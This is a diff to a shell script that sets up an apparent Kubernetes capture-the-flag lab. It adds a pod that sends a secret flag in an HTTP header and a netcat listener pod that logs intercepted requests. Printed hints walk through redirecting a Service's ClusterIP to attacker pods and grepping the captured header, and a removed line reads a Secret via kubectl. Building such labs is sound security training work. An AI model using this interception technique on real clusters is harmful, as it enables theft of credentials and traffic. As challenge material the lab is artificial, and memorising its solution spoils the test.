@@ -102,7 +102,43 @@ spec:
           ports:
             - containerPort: 8080
 ---
-# Attacker pod with netcat to capture intercepted traffic
+# Flag-bearing client: periodically calls the internal-api Service ClusterIP
+# with the flag in an X-Flag header (read from the Secret at runtime)
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: flag-client
+  namespace: secure-ns
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: flag-client
+  template:
+    metadata:
+      labels:
+        app: flag-client
+    spec:
+      containers:
+        - name: client
+          image: alpine:latest
+          imagePullPolicy: IfNotPresent
+          command: ["sh", "-c"]
+          args:
+            - |
+              while true; do
+                wget -qO- --timeout=2 --header="X-Flag: $X_FLAG" \
+                  http://internal-api.secure-ns.svc.cluster.local:8080/ >/dev/null 2>&1 || true
+                sleep 5
+              done
+          env:
+            - name: X_FLAG
+              valueFrom:
+                secretKeyRef:
+                  name: target-flag
+                  key: flag
+---
+# Attacker pod: listens on 8080 to capture intercepted traffic
 apiVersion: v1
 kind: Pod
 metadata:
@@ -112,11 +148,14 @@ spec:
   serviceAccountName: attacker-sa
   containers:
     - name: attacker
-      image: nginx:1.24-alpine
+      image: alpine:latest
       imagePullPolicy: IfNotPresent
       command: ["sh", "-c"]
       args:
-        - "apk add --no-cache curl bash >/dev/null 2>&1 && echo attacker-ready && nginx -g 'daemon off;' & sleep 3600"
+        - |
+          while true; do
+            printf 'HTTP/1.1 200 OK\r\n\r\n' | nc -l -p 8080 -q 1 >> /tmp/captured_requests.txt 2>/dev/null || true
+          done
       ports:
         - containerPort: 8080
 YAML
@@ -124,6 +163,7 @@ YAML
 echo "[*] Waiting for pods..."
 k8s_wait_pod "attacker-pod" "attack-ns"
 k8s_wait_pods_label "app=internal-api" "secure-ns"
+k8s_wait_pods_label "app=flag-client" "secure-ns"
 sleep 5
 
 # Get the target service's ClusterIP for the hint
@@ -152,5 +192,6 @@ echo "           - port: 8080"
 echo "             targetPort: 8080"
 echo "       EOF"
 echo "    3. All traffic to $TARGET_IP:8080 now routes to attacker's pods"
-echo "    4. Intercept flag-bearing X-Flag header in captured requests"
-echo "    5. Or read the flag Secret directly: kubectl get secret target-flag -n secure-ns -o jsonpath='{.data.flag}' | base64 -d"
+echo "    4. Intercept the flag-bearing X-Flag header from captured requests:"
+echo "       kubectl exec -n attack-ns attacker-pod -- grep -o 'X-Flag: [^ ]*' /tmp/captured_requests.txt"
+echo "    5. The attacker SA has NO secrets read permission in secure-ns (RBAC-scoped)"
